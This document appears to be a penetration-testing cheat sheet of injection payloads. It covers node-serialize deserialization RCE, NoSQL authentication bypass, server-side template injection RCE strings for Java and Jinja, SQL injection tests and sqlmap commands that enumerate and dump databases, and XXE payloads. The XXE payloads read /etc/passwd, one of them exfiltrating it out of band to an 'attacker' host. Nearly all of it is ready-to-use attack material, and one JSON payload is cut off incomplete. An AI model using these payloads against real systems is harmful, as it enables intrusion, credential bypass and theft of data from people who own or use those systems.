# Types

- Code Injection
- Deserialization Injection
- NoSQL Injection
- Server-Side Template Injection
- SQL Injection
- XML External Entity

# Deserialization Injection

## JavaScript

Payload Generator
```
var y = {
	rce : function(){
		require('child_process').exec('ping -c 1 ipaddress /', function(error, stdout,	stderr) { console.log(stdout) });
	},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

# NoSQL Injection

Test Payload 1
`admin' || '' === '`

Test Payload 2
```
Content-Type: application/x-www-form-urlencoded
user=admin&password[$ne]=admin
```

Test Payload 3
```
Content-Type: application/json
{
	"user":"admin",
```

Test Payload 4
```
Content-Type: application/json
{
	"user":"admin",
	"password":{
		"$ne":"admin"
	}
}
```

# Server-Side Template Injection

## Java

RCE Payload 1
```
*
{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('payload')
.getInputStream())}
```

## Python

Test Payload 1
`{{1+1}}` (Should eval to 2)

RCE Payload 1
`{{config.__class__.__init__.__globals__['os'].popen('payload').read()}}`

RCE Payload 2
```
{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen("payload").read()}}
```

# SQL Injection

## Manual

Basic Test 1
`admin' or 1=1--`

Basic Test 2
`admin' or 1=1#`

## sqlmap

### Request

Initial Tests
`sqlmap -r http-request.txt`

Check User Privs (E.g., FILE)
`sqlmap -r http-request.txt --privileges`

Enumerate databases
`sqlmap -r http-request.txt --dbs`

Get table names from dbname database
`sqlmap -r http-request.txt -D dbname --tables`

Dump the tblname table
`sqlmap -r http-request.txt -D dbname -T tblname --dump`

### CLI Spec

Login, Username Param
`sqlmap -u http://url/endpoint?action=login --data="username=abc&password=abc" -p username [--level 5 --risk 3 to find more options] --batch`

JSON API
`sqlmap -u "protocol:address:port" --data '{"param_name": "*"}' --dbs [--threads 10 for speed] [--level 5 --risk 3 to find more options] --batch`

# XML External Entity

## LFI Method 1

```
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<exampletag>&file;</exampletag>
```

## LFI Method 2

Create Payload
```
evil.dtd accessible via attacker web server:

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">

<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://attacker/?p=%file;'>" >
```

Start web server

Inject Stager
```
<?xml version="1.0" ?>
<!DOCTYPE ANY [
<!ENTITY % remote SYSTEM 'http://attacker/evil.dtd'>%remote;%init;%trick;
]>
```
